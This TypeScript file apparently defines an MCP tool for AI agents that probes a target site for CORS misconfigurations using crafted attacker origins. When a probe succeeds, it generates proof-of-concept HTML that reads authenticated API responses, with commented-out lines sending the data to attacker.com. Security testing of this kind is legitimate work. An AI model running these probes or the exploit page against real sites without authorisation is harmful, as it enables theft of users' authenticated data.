/**
 * CORS misconfiguration testing tools.
 *
 * Tests for origin reflection, null origin trust, and subdomain wildcard issues.
 * Based on PortSwigger CORS labs.
 */

import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { z } from "zod";
import { runCmd, requireTool } from "../runner.js";

export function register(server: McpServer): void {
  server.tool(
    "cors_test",
    "Test CORS misconfigurations: origin reflection, null origin trust, subdomain wildcards. Sends requests with various Origin headers and checks Access-Control-Allow-Origin and Access-Control-Allow-Credentials in the response. Misconfigurations allow attacker sites to read authenticated API responses. Returns: {results: [{test, origin_sent, acao, acac, vulnerable}], exploit_html}. Side effects: Read-only requests with custom Origin headers. Sends ~8 requests.",
    {
      url: z
        .string()
        .describe(
          "Base URL of the target application, e.g. https://target.com"
        ),
      api_endpoint: z
        .string()
        .describe(
          "API endpoint to test CORS on, e.g. /api/account or /api/users/me"
        ),
      auth_cookie: z
        .string()
        .optional()
        .describe("Session cookie to include for authenticated CORS tests"),
    },
    async ({ url, api_endpoint, auth_cookie }) => {
      requireTool("curl");

      const parsed = new URL(url);
      const domain = parsed.hostname || "";
      const scheme = parsed.protocol.replace(":", "") || "https";
      const fullApi = `${scheme}://${domain}${api_endpoint}`;

      // Test origins
      const testOrigins: [string, string][] = [
        ["arbitrary_origin", "https://evil-attacker.com"],
        ["null_origin", "null"],
        ["subdomain_wildcard", `https://evil.${domain}`],
        ["prefix_match", `https://${domain}.evil.com`],
        ["suffix_match", `https://evil-${domain}`],
        ["with_credentials", "https://attacker.example.com"],
        ["http_downgrade", `http://${domain}`],
        ["localhost", "http://localhost"],
      ];

      const results: Array<{
        test: string;
        origin_sent: string;
        access_control_allow_origin: string | null;
        access_control_allow_credentials: string | null;
        vulnerable: boolean;
      }> = [];
      let exploitHtml: string | null = null;

      for (const [testName, origin] of testOrigins) {
        const curlArgs: string[] = [
          "-sk",
          "-D",
          "-",
          "-o",
          "/dev/null",
          "-H",
          `Origin: ${origin}`,
        ];
        if (auth_cookie) {
          curlArgs.push("-b", auth_cookie);
        }
        curlArgs.push(fullApi);

        const res = await runCmd("curl", curlArgs);
        const headersRaw = res.stdout;

        let acao: string | null = null;
        let acac: string | null = null;
        for (const line of headersRaw.split("\n")) {
          const lower = line.toLowerCase().trim();
          if (lower.startsWith("access-control-allow-origin:")) {
            acao = line.split(":", 1)[0] === line.split(":", 1)[0]
              ? line.slice(line.indexOf(":") + 1).trim()
              : null;
            // Simpler extraction:
            acao = line.substring(line.indexOf(":") + 1).trim();
          } else if (lower.startsWith("access-control-allow-credentials:")) {
            acac = line.substring(line.indexOf(":") + 1).trim();
          }
        }

        // Vulnerable if our origin is reflected AND credentials are allowed
        let vulnerable = false;
        if (acao && origin !== "null") {
          if (acao === origin || acao === "*") {
            vulnerable = true;
          }
        } else if (acao && origin === "null") {
          if (acao === "null") {
            vulnerable = true;
          }
        }

        // Credentials with wildcard is technically invalid but some servers misconfigure
        if (acao === "*" && acac && acac.toLowerCase() === "true") {
          vulnerable = true;
        }

        results.push({
          test: testName,
          origin_sent: origin,
          access_control_allow_origin: acao,
          access_control_allow_credentials: acac,
          vulnerable,
        });
      }

      const vulnerableTests = results.filter((r) => r.vulnerable);

      // Generate exploit HTML for the first vulnerable origin
      if (vulnerableTests.length > 0) {
        const vuln = vulnerableTests[0];
        const exploitOrigin = vuln.origin_sent;
        exploitHtml = `<!DOCTYPE html>
<html>
<head><title>CORS Exploit PoC</title></head>
<body>
<h1>CORS Exploit</h1>
<pre id="output">Loading...</pre>
<script>
    // This page must be hosted on: ${exploitOrigin}
    var req = new XMLHttpRequest();
    req.onload = function() {
        document.getElementById('output').textContent = this.responseText;
        // Exfiltrate to attacker server:
        // fetch('https://attacker.com/collect?data=' + encodeURIComponent(this.responseText));
    };
    req.open('GET', '${fullApi}', true);
    req.withCredentials = true;
    req.send();
</script>
</body>
</html>`;

        // If null origin worked, use sandboxed iframe variant
        const nullVuln = vulnerableTests.filter(
          (r) => r.origin_sent === "null"
        );
        if (nullVuln.length > 0) {
          exploitHtml += `

<!-- NULL Origin variant using sandboxed iframe -->
<iframe sandbox="allow-scripts allow-forms" srcdoc="
    <script>
        var req = new XMLHttpRequest();
        req.onload = function() {
            // document.location = 'https://attacker.com/collect?data=' + encodeURIComponent(this.responseText);
            parent.postMessage(this.responseText, '*');
        };
        req.open('GET', '${fullApi}', true);
        req.withCredentials = true;
        req.send();
    </script>
"></iframe>`;
        }
      }

      const result = {
        target_api: fullApi,
        results,
        vulnerable_origins: vulnerableTests.map((r) => r.origin_sent),
        exploit_html: exploitHtml,
        hint:
          vulnerableTests.length > 0
            ? `CORS misconfiguration found! ${vulnerableTests.length} origin(s) accepted.`
            : "CORS appears properly configured. No arbitrary origins accepted with credentials.",
      };

      return { content: [{ type: "text", text: JSON.stringify(result, null, 2) }] };
    }
  );
}
